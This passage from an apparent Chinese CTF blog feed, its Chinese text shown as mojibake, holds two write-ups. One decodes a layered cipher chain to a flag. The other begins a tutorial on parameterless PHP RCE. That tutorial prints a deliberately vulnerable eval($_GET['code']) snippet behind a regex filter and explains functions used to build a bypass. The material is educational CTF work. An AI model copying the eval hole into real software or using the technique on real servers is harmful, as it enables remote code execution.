å¾ˆå¿«å•Š  æˆ‘å…¨éƒ½é˜²ä½äº†</span><br></pre></td></tr></table></figure><p><code>2^4_2^5_2^6.mp4</code>ä¸ºé—ªç”µäº”è¿é­çš„è§†é¢‘ï¼Œä¸­é—´æœ‰ä¸€å¸§ç”»é¢æœ‰ä¸œè¥¿</p><blockquote><p><code>63E3A.zip</code>å’Œ<code>63F5F.zip</code>è§£å‹å‡ºæ¥å°±æ˜¯<code>2^4_2^5_2^6.mp4</code></p></blockquote><p><img src="https://s3.ax1x.com/2020/12/23/ry4BJ1.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2lnbl9pbg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64è§£ç ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sign_in</span><br></pre></td></tr></table></figure><p>æŠŠ<code>2^4_2^5_2^6.mp4</code>æ‹–åˆ°010editorï¼Œå‘ç°æ–‡ä»¶å°¾æœ‰ä¸ªPKå¼€å¤´çš„å‹ç¼©åŒ…ï¼Œå¤åˆ¶å¦å­˜ä¸º1.zip</p><blockquote><p>ä¹Ÿå¯ä»¥ç”¨kaliè‡ªå¸¦çš„binwalkæå–</p></blockquote><p><img src="https://s3.ax1x.com/2020/12/23/rcAtr6.png"></p><p>è§£å‹éœ€è¦å¯†ç ï¼Œå°†<code>sign_in</code>ä½œä¸ºå¯†ç ï¼Œè§£å‹å¾—åˆ°19_20.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R1pCVE9OUlhHVTNES05SWkdZWVRNUVJYSEEzVEtOUlVHNFpUT09KWEdFM0RLTlJZRzRaVE9RSlhHRTNEUU5aWkdaQkRNTlpXRzQzVEdOWlpHNDRUTVFaV0lJM1RNTlpXR1k0UT09PT0&#x3D;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;The last layer is the single table replacement password</span><br></pre></td></tr></table></figure><blockquote><p>ç¿»è¯‘ï¼šæœ€åä¸€å±‚æ˜¯å•è¡¨æ›¿æ¢å¯†ç </p></blockquote><p>base64è§£ç å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GZBTONRXGU3DKNRZGYYTMQRXHA3TKNRUG4ZTOOJXGE3DKNRYG4ZTOQJXGE3DQNZZGZBDMNZWG43TGNZZG44TMQZWII3TMNZWGY4Q&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base32è§£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6C76756569616B7875647379716568737A7168796B67677379796C6B767669</span><br></pre></td></tr></table></figure><p>åå…­è¿›åˆ¶è½¬å­—ç¬¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvueiakxudsyqehszqhykggsyylkvvi</span><br></pre></td></tr></table></figure><br><p><code>19_20.txt</code>è¯´æœ€åä¸€å±‚æ˜¯å•è¡¨æ›¿æ¢å¯†ç ï¼Œè€Œä»¿å°„å¯†ç æ˜¯ä¸€ç§è¡¨å•ä»£æ¢å¯†ç </p><p>æ ¹æ®æ–‡ä»¶åï¼Œè®¾a=19ï¼Œb=20</p><p>ä½¿ç”¨è„šæœ¬è¿›è¡Œä»¿å°„å¯†ç è§£å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;lvueiakxudsyqehszqhykggsyylkvvi&quot;</span>.upper()</span><br><span class="line">a = <span class="number">19</span></span><br><span class="line">b = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k = a //b</span><br><span class="line">        remainder = a % b</span><br><span class="line">        x1, y1 = get(b, remainder)</span><br><span class="line">        x, y =y1, x1 - k * y1</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line">x, y = get(a, <span class="number">26</span>)</span><br><span class="line">a1 = x % <span class="number">26</span></span><br><span class="line"> </span><br><span class="line">l= len(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">    cipher = a1 * (ord(s[i])- <span class="number">65</span> - b) % <span class="number">26</span></span><br><span class="line">    res=chr(cipher + <span class="number">65</span>)</span><br><span class="line">    print(res.lower(), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagyouhavesignedinsuccessfully</span><br></pre></td></tr></table></figure><p>æ ¹æ®é¢˜ç›®æç¤ºï¼šflagæ ¼å¼flag{xxx_xxxx_xxxxxx_xx_xxxxxxxxxxxx}</p><p>åŠ ä¸Šä¸‹åˆ’çº¿ï¼Œå¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;you_have_signed_in_successfully&#125;</span><br></pre></td></tr></table></figure><p>é™„ï¼š</p><p>ä»¿å°„å¯†ç è§£å¯†åŸå§‹è„šæœ¬ï¼š<a href="https://blog.csdn.net/x_yhy/article/details/83756908">ä»¿å°„å¯†ç è§£å¯†ï¼ˆAffine Cipherï¼‰</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ä»¿å°„å¯†ç è§£å¯†</span></span><br><span class="line"><span class="comment">#æ”¹è¿›æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚çº¿æ€§æ–¹ç¨‹çš„xä¸y</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k = a //b</span><br><span class="line">        remainder = a % b</span><br><span class="line">        x1, y1 = get(b, remainder)</span><br><span class="line">        x, y =y1, x1 - k * y1</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"> </span><br><span class="line">s = input(<span class="string">&quot;è¯·è¾“å…¥è§£å¯†å­—ç¬¦ï¼š&quot;</span>).upper()</span><br><span class="line">a = int(input(<span class="string">&quot;è¯·è¾“å…¥aï¼š&quot;</span>))</span><br><span class="line">b = int(input(<span class="string">&quot;è¯·è¾“å…¥bï¼š&quot;</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#æ±‚aå…³äº26çš„ä¹˜æ³•é€†å…ƒ</span></span><br><span class="line">x, y = get(a, <span class="number">26</span>)</span><br><span class="line">a1 = x % <span class="number">26</span></span><br><span class="line"> </span><br><span class="line">l= len(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">    cipher = a1 * (ord(s[i])- <span class="number">65</span> - b) % <span class="number">26</span></span><br><span class="line">    res=chr(cipher + <span class="number">65</span>)</span><br><span class="line">    print(res, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ä¿¡æ¯å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ— å‚æ•°RCE</title>
      <link href="2020/12/03/%E6%97%A0%E5%8F%82%E6%95%B0RCE/"/>
      <url>2020/12/03/%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
      
        <content type="html"><![CDATA[<p>æ— å‚æ•°RCEï¼šå°±æ˜¯åªä½¿ç”¨å‡½æ•°ï¼Œä¸”å‡½æ•°ä¸èƒ½å¸¦æœ‰å‚æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h2><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><ul><li>è¯­æ³•ï¼š</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, <span class="keyword">int</span> $limit = <span class="number">-1</span> [, <span class="keyword">int</span> &amp;$count ]] )</span><br></pre></td></tr></table></figure><p><code>pattern</code>ï¼šè¦æœç´¢çš„æ¨¡å¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„</p><p><code>replacement</code>ï¼šç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„</p><p><code>subject</code>ï¼šè¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„</p><p><code>limit</code>ï¼šå¯é€‰ï¼Œå¯¹äºæ¯ä¸ªæ¨¡å¼ç”¨äºæ¯ä¸ª subject å­—ç¬¦ä¸²çš„æœ€å¤§å¯æ›¿æ¢æ¬¡æ•°ã€‚ é»˜è®¤æ˜¯-1ï¼ˆæ— é™åˆ¶ï¼‰</p><p><code>count</code>ï¼šå¯é€‰ï¼Œä¸ºæ›¿æ¢æ‰§è¡Œçš„æ¬¡æ•°</p><ul><li>ç®€åŒ–ä¸ºï¼š</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(pattern, replacement, subject)</span><br></pre></td></tr></table></figure><p>å³ï¼šå°†<code>subject</code>ä¸­ç¬¦åˆ<code>pattern</code>çš„æ›¿æ¢ä¸º<code>replacement</code></p><p>å¯¹äº<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code></p><p>æ„æ€æ˜¯ï¼Œå¯¹ä¼ è¿›æ¥çš„codeè¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„éƒ¨åˆ†æ›¿æ¢ä¸ºç©ºï¼Œç„¶åè¿”å›ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²</p><h3 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h3><p>æ­£åˆ™è¡¨è¾¾å¼ï¼ˆRegular Expressionï¼‰æè¿°äº†ä¸€ç§å­—ç¬¦ä¸²åŒ¹é…çš„æ¨¡å¼ï¼ˆpatternï¼‰ï¼Œå¯ä»¥ç”¨æ¥æ£€æŸ¥ä¸€ä¸ªä¸²æ˜¯å¦å«æœ‰æŸç§å­ä¸²ã€å°†åŒ¹é…çš„å­ä¸²æ›¿æ¢æˆ–è€…ä»æŸä¸ªä¸²ä¸­å–å‡ºç¬¦åˆæŸä¸ªæ¡ä»¶çš„å­ä¸²ç­‰ã€‚</p><p><a href="https://www.runoob.com/regexp/regexp-syntax.html">æ­£åˆ™è¡¨è¾¾å¼ â€“ è¯­æ³• | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str=<span class="string">&#x27;01ABcdEf_230G&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/0/&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, $str).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;    <span class="comment">//å°†0æ¢æˆA</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $str).<span class="string">&#x27;&lt;br&gt;&#x27;</span>; <span class="comment">//å»æ‰æ‰€æœ‰æ•°å­—</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[a-z]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $str).<span class="string">&#x27;&lt;br&gt;&#x27;</span>; <span class="comment">//å»æ‰æ‰€æœ‰å°å†™å­—æ¯</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[A-Z]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $str).<span class="string">&#x27;&lt;br&gt;&#x27;</span>; <span class="comment">//å»æ‰æ‰€æœ‰å¤§å†™å­—æ¯</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[^A-Z]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $str).<span class="string">&#x27;&lt;br&gt;&#x27;</span>; <span class="comment">//å»æ‰é™¤äº†å¤§å†™å­—æ¯å¤–æ‰€æœ‰çš„å­—ç¬¦</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[a-z A-Z]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $str).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;<span class="comment">//å»æ‰æ‰€æœ‰å¤§å°å†™å­—æ¯</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>A1ABcdEf_23AG<br>ABcdEf_G<br>01ABE_230G<br>01cdf_230<br>ABEG<br>01_230<br></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;abcABC123_+-*/&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[\w]/&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $a).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[\W]/&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $a).<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[^\W]/&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $a).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>!!!!!!!!!!+-<em>/<br>abcABC123_!!!!<br>!!!!!!!!!!+-</em>/<br></p></blockquote><p><code>\w</code>ï¼šåŒ¹é…å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äº<code>[A-Z a-z 0-9 _]</code></p><p><code>\W</code>ï¼šåŒ¹é…éå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äº<code>[^A-Z a-z 0-9 _]</code></p><p>è€Œ<code>(?R)</code>æ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼çš„æ„æ€ï¼Œå³å¯ä»¥ç”¨<code>/[^\W]+\((?R)?\)/</code>æ›¿æ¢åˆ°<code>(?R)</code>çš„ä½ç½®</p><p><code>(?R)?</code> è¿™é‡Œå¤šä¸€ä¸ª?è¡¨ç¤ºå¯ä»¥æœ‰å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥è¡ç”ŸåŒ¹é…ã€‚</p><p>å³ï¼š<code>(?R)?</code>è¡¨ç¤ºé€’å½’æ•´ä¸ªåŒ¹é…æ¨¡å¼</p><p>æ‰€ä»¥<code>/[^\W]+\((?R)?\)/</code>åˆèµ·æ¥å°±æ˜¯åŒ¹é…æ— å‚æ•°çš„å‡½æ•°ï¼Œå‡½æ•°å†…éƒ¨å¯ä»¥æ— é™åµŒå¥—ç›¸åŒçš„æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯è¯´åªåŒ¹é…<code>å­—ç¬¦ä¸²+()</code>çš„ç±»å‹ï¼Œå¹¶ä¸”æ‹¬å·å†…ä¸º<code>ç©ºå­—ç¬¦ä¸²</code>æˆ–<code>å­—ç¬¦ä¸²+()</code>ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ‰€ä»¥å¯¹äº<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code></p><p>åƒ<code>fun1(fun2(fun3()))</code>æœ€ç»ˆä¼šè¢«æ›¿æ¢ä¸ºç©º</p><p>è€Œ<code>fun1(fun2(fun3(aaa)))</code>åˆ™ä¸ä¼šè¿›è¡Œæ›¿æ¢ï¼Œç»“æœä»ä¸º<code>fun1(fun2(fun3(aaa)))</code></p><p><img src="https://s3.ax1x.com/2020/11/26/DBRnKg.png"></p><br><h2 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h2><h3 id="show-source"><a href="#show-source" class="headerlink" title="show_source()"></a>show_source()</h3><p>æ‰©å±•ï¼šhighlight_file() é«˜äº®è¯»å–æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show_source()å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æç¤º</span><br><span class="line">show_source(filename,return)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">filename</td><td align="left">å¿…éœ€ã€‚è¦è¿›è¡Œé«˜äº®å¤„ç†çš„ PHP æ–‡ä»¶çš„è·¯å¾„ã€‚</td></tr><tr><td align="left">return</td><td align="left">å¯é€‰ã€‚å¦‚æœè®¾ç½® trueï¼Œåˆ™æœ¬å‡½æ•°è¿”å›é«˜äº®å¤„ç†çš„ä»£ç ã€‚</td></tr></tbody></table><ul><li>test.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__FILE__</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>).<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/08/17/dZ6b9J.png" alt="dZ6b9J.png"></p><h3 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv()"></a>localeconv()</h3><p>localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ï¼Œä¸”ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºç‚¹ï¼ˆ.)ã€‚</p><p>localeconv() å‡½æ•°ä¼šè¿”å›ä»¥ä¸‹æ•°ç»„å…ƒç´ ï¼š</p><ul><li>[decimal_point] - å°æ•°ç‚¹å­—ç¬¦</li><li>[thousands_sep] - åƒä½åˆ†éš”ç¬¦</li><li>[int_curr_symbol] - è´§å¸ç¬¦å· ï¼ˆä¾‹å¦‚ï¼šUSDï¼‰</li><li>[currency_symbol] - è´§å¸ç¬¦å· ï¼ˆä¾‹å¦‚ï¼š$ï¼‰</li><li>[mon_decimal_point] - è´§å¸å°æ•°ç‚¹å­—ç¬¦</li><li>[mon_thousands_sep] - è´§å¸åƒä½åˆ†éš”ç¬¦</li><li>[positive_sign] - æ­£å€¼å­—ç¬¦</li><li>[negative_sign] - è´Ÿå€¼å­—ç¬¦</li><li>[int_frac_digits] - å›½é™…é€šç”¨å°æ•°ä½</li><li>[frac_digits] - æœ¬åœ°é€šç”¨å°æ•°ä½</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(localeconv());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>array(18) {<br>  [â€œdecimal_pointâ€]=&gt;<br>  string(1) â€œ.â€<br>  [â€œthousands_sepâ€]=&gt;<br>  string(0) â€œâ€<br>  [â€œint_curr_symbolâ€]=&gt;<br>  string(0) â€œâ€<br>  [â€œcurrency_symbolâ€]=&gt;<br>  string(0) â€œâ€<br>  [â€œmon_decimal_pointâ€]=&gt;<br>  string(0) â€œâ€<br>  [â€œmon_thousands_sepâ€]=&gt;<br>  string(0) â€œâ€<br>  [â€œpositive_signâ€]=&gt;<br>  string(0) â€œâ€<br>  [â€œnegative_signâ€]=&gt;<br>  string(0) â€œâ€<br>  [â€œint_frac_digitsâ€]=&gt;<br>  int(127)<br>  [â€œfrac_digitsâ€]=&gt;<br>  int(127)<br>  [â€œp_cs_precedesâ€]=&gt;<br>  int(127)<br>  [â€œp_sep_by_spaceâ€]=&gt;<br>  int(127)<br>  [â€œn_cs_precedesâ€]=&gt;<br>  int(127)<br>  [â€œn_sep_by_spaceâ€]=&gt;<br>  int(127)<br>  [â€œp_sign_posnâ€]=&gt;<br>  int(127)<br>  [â€œn_sign_posnâ€]=&gt;<br>  int(127)<br>  [â€œgroupingâ€]=&gt;<br>  array(0) {<br>  }<br>  [â€œmon_groupingâ€]=&gt;<br>  array(0) {<br>  }<br>}</p></blockquote><h3 id="pos"><a href="#pos" class="headerlink" title="pos()"></a>pos()</h3><p>pos() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ï¼ˆå–ç¬¬ä¸€ä¸ªå…ƒç´ ï¼‰ã€‚</p><p>è¯¥å‡½æ•°æ˜¯ <a href="https://www.w3school.com.cn/php/func_array_current.asp">current()</a> å‡½æ•°çš„åˆ«åã€‚</p><p>å¦‚æœpos()å’Œcurrent()éƒ½è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨reset()ã€‚</p><p>æ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒçš„â€å½“å‰â€å…ƒç´ ï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p><p>ç›¸å…³çš„æ–¹æ³•ï¼š</p><ul><li><a href="https://www.w3school.com.cn/php/func_array_current.asp">current()</a> - è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼</li><li><a href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨</li></ul><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h3><p>scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scandir(directory,sorting_order,context);</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>directory</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æ‰«æçš„ç›®å½•ã€‚</td></tr><tr><td align="left"><em>sorting_order</em></td><td align="left">å¯é€‰ã€‚è§„å®šæ’åˆ—é¡ºåºã€‚é»˜è®¤æ˜¯ 0ï¼Œè¡¨ç¤ºæŒ‰å­—æ¯å‡åºæ’åˆ—ã€‚å¦‚æœè®¾ç½®ä¸º SCANDIR_SORT_DESCENDING æˆ–è€… 1ï¼Œåˆ™è¡¨ç¤ºæŒ‰å­—æ¯é™åºæ’åˆ—ã€‚å¦‚æœè®¾ç½®ä¸º SCANDIR_SORT_NONEï¼Œåˆ™è¿”å›æœªæ’åˆ—çš„ç»“æœã€‚</td></tr><tr><td align="left"><em>context</em></td><td align="left">å¯é€‰ã€‚è§„å®šç›®å½•å¥æŸ„çš„ç¯å¢ƒã€‚<em>context</em> æ˜¯å¯ä¿®æ”¹ç›®å½•æµçš„è¡Œä¸ºçš„ä¸€å¥—é€‰é¡¹ã€‚</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">&#x27;D:\ant&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/08/17/dZgcyn.png" alt="dZgcyn.png"></p><h3 id="chr"><a href="#chr" class="headerlink" title="chr()"></a>chr()</h3><p>chr() å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚</p><p>ASCII å€¼å¯è¢«æŒ‡å®šä¸ºåè¿›åˆ¶å€¼ã€å…«è¿›åˆ¶å€¼æˆ–åå…­è¿›åˆ¶å€¼ã€‚å…«è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0ï¼Œè€Œåå…­è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0xï¼›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 